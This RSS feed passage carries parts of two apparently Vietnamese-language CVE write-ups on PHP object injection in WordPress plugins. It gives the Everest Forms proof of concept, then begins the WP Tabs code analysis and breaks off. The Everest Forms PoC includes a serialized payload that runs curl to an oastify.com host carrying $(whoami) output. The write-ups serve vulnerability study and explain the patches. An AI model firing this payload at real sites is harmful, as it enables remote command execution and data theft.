1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User submits form → Data stored in $entry_meta&amp;#34;] --&amp;gt; B[&amp;#34;Admin opens Entries page in wp-admin&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;entries_page() executed&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;GET[&amp;#39;view-entry&amp;#39;] exists?&amp;#34;}&#xA;D --&amp;gt;|No| Z[&amp;#34;Show entries table&amp;#34;]&#xA;D --&amp;gt;|Yes| E[&amp;#34;Load html-admin-page-entries-view.php&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;foreach ($entry_meta as meta_key =&amp;gt; meta_value)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Is meta_value JSON?&amp;#34;}&#xA;G --&amp;gt;|Yes| H[&amp;#34;json_decode() → meta_value[&amp;#39;value&amp;#39;]&amp;#34;]&#xA;G --&amp;gt;|No| I[&amp;#34;meta_value = wp_strip_all_tags()&amp;#34;]&#xA;&#xA;H --&amp;gt; J[&amp;#34;field_value = apply_filters(&amp;#39;everest_forms_html_field_value&amp;#39;, meta_value, ...)&amp;#34;]&#xA;I --&amp;gt; J&#xA;&#xA;J --&amp;gt; K{&amp;#34;field_value is serialized?&amp;#34;}&#xA;K --&amp;gt;|No| L[&amp;#34;Display value normally&amp;#34;]&#xA;K --&amp;gt;|Yes| M[&amp;#34;maybe_unserialize(field_value) ← Vulnerable&amp;#34;]&#xA;&#xA;M --&amp;gt; N{&amp;#34;Unserialize produces object?&amp;#34;}&#xA;N --&amp;gt;|Yes| R[&amp;#34;Object Injection → Possible exploit if POP chain exists&amp;#34;]&#xA;N --&amp;gt;|No| L&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Submit form với giá trị được encode JSON chứa chuỗi serialized:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /2025/11/22/test/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;Content-Disposition: form-data; name=&amp;#34;everest_forms[form_fields][fullname]&amp;#34;&#xA;&#xA;{&amp;#34;value&amp;#34;:&amp;#34;a:1:{i:0;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\&amp;#34;;}}&amp;#34;}&#xA;------geckoformboundary8355bd6da3783bb27aa92837fe803a6e&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Administrator xem entry được submit&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#39; alt=&#34;Result&#34; height=&#34;614&#34; width=&#34;1119&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng tồn tại do việc &lt;strong&gt;unserialize dữ liệu người dùng trực tiếp thông qua &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; mà không giới hạn lớp được phép khởi tạo. Điều này dẫn tới khả năng &lt;strong&gt;PHP Object Injection&lt;/strong&gt;, và trong môi trường có sẵn chuỗi POP, kẻ tấn công chưa xác thực có thể thực hiện các hành động nguy hiểm như đọc, ghi, xóa file hoặc thậm chí thực thi mã từ xa. Bản vá sử dụng &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; với &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt; đã triệt tiêu hoàn toàn nguy cơ này.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: sử dụng &lt;code&gt;maybe_unserialize()&lt;/code&gt; trên dữ liệu từ người dùng mà không kiểm soát lớp được phép tạo ra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Impact&lt;/strong&gt;: Object Injection và có thể tiến tới RCE nếu tồn tại POP chain từ plugin hoặc theme khác.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Attack surface&lt;/strong&gt;: Bị trigger khi admin mở trang xem Entries; dữ liệu độc hại đã tồn tại từ phần submit form.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix&lt;/strong&gt;: Sử dụng &lt;code&gt;unserialize()&lt;/code&gt; với tùy chọn &lt;code&gt;allowed_classes = false&lt;/code&gt;, ngăn chặn tạo object từ dữ liệu không tin cậy.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lesson learned&lt;/strong&gt;: Mọi dữ liệu unserialize phải được hạn chế lớp, lọc hoặc chuyển sang các định dạng an toàn hơn như JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.1.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48134 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-24-cve-2025-48134/</link>
      <pubDate>Mon, 24 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-24-cve-2025-48134/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng Deserialization of Untrusted Data trong ShapedPlugin LLC WP Tabs cho phép Object Injection. Vấn đề này ảnh hưởng đến WP Tabs: từ n/a cho đến phiên bản 2.2.12.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48134&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48134&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.2.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: [WordPress WP Tabs Plugin]https://wordpress.org/plugins/wp-expand-tabs-free/)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Tabs&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.12&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.13&lt;/code&gt; – **patched&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v2.2.12):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$value&lt;/code&gt; sau khi replace &lt;code&gt;&#39;{#ID#}&#39;&lt;/code&gt; bằng &lt;code&gt;$new_tabs_id&lt;/code&gt;). Điều này tạo ra lỗ hổng nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy cơ Object Injection&lt;/strong&gt;: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến &lt;strong&gt;Object Injection&lt;/strong&gt; và có khả năng tiến tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thiếu kiểm tra an toàn&lt;/strong&gt;: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không có cơ chế fallback&lt;/strong&gt;: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v2.2.13):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#39; alt=&#34;Diff&#34; height=&#34;320&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã sử dụng &lt;code&gt;unserialize&lt;/code&gt; với option &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt; đã loại bỏ hoàn toàn khả năng tạo object, từ đó xử lý triệt để lỗ hổng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một ajax dành cho người dùng đã đăng nhập (&lt;code&gt;wp_ajax_&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;loader-&amp;gt;add_action( &amp;#39;wp_ajax_tabs_import_shortcode&amp;#39;, $import_export, &amp;#39;import_shortcode&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=tabs_import_shortcode&lt;/code&gt; thì callback &lt;code&gt;import_shortcode&lt;/code&gt; sẽ được gọi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_shortcode() {&#xA;    $nonce = ( ! empty( $_POST[&amp;#39;nonce&amp;#39;] ) ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;wptabspro_options_nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html__( &amp;#39;Error: Nonce verification has failed. Please try again.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ) ), 401 );&#xA;    }&#xA;    $allow_tags = isset( $_POST[&amp;#39;unSanitize&amp;#39;] ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;unSanitize&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    // Don&amp;#39;t worry sanitize after JSON decode below.&#xA;    $data         = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;    $data       = json_decode( $data );&#xA;    $data       = json_decode( $data, true );&#xA;    $shortcodes = $allow_tags ? $data[&amp;#39;shortcode&amp;#39;] : wp_kses_post_deep( $data[&amp;#39;shortcode&amp;#39;] );&#xA;    if ( ! $data ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Nothing to import.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;import( $shortcodes );&#xA;&#xA;    if ( is_wp_error( thing: $status ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message(),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    wp_send_json_success( $status, 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra nonce, nếu không hợp lệ thì gửi error và dừng chương trình lại.&lt;/p&gt;&#xA;&lt;p&gt;Khi test các chức năng của plugin, tôi thấy chức năng &lt;strong&gt;import&lt;/strong&gt; xuất hiện ở endpoint &lt;code&gt;/wp-admin/edit.php?post_type=sp_wp_tabs&amp;amp;page=tab_tools#tab=2&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#34; title=&#34;Import feature&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/search1.png&#34; data-sub-html=&#34;&lt;h2&gt;Import feature&lt;/h2&gt;&lt;p&gt;Import feature&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#39; alt=&#34;Import feature&#34; height=&#34;519&#34; width=&#34;1238&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Import feature&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chức năng này chỉ dành cho Administrator, nên nonce hợp lệ cũng là nonce thuộc về Administrator.&lt;/p&gt;&#xA;&lt;p&gt;Dữ liệu trong JSON file được upload sẽ được gán cho param &lt;code&gt;shortcode&lt;/code&gt; khi POST request được gửi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data       = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;$data       = json_decode( $data );&#xA;$data       = json_decode( $data, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin lấy dữ liệu này và thực hiện decode JSON 2 lần. Ở lần 2 với tham số thứ 2 &lt;code&gt;associative=true&lt;/code&gt; thì JSON sẽ được convert sang array trong 